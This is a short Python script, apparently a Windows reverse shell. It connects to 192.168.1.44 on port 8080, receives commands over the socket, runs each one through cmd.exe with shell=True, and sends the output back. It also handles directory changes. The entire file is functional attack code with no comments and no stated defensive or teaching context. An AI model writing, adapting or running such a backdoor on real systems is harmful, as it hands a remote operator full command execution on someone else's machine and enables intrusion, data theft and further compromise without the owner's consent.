import socket, os, sys
import subprocess as sp
from time import sleep

if __name__ == ("__main__"):
    socket = socket.socket()
    socket.connect(("192.168.1.44", 8080))
    while True:
        command = socket.recv(4096).decode()
        if command == ("exit"):
            socket.close()
            sys.exit()
        if len(command) > 2 and len(command[3:]) > 0:
            if os.path.exists(command[3:]) and os.path.isdir(command[3:]):
                os.chdir(command[3:])
        run = sp.run(["cmd.exe", "/C", command], capture_output=True, shell=True,
        text=True, universal_newlines=True).stdout
        run = run.encode()
        socket.send(run)
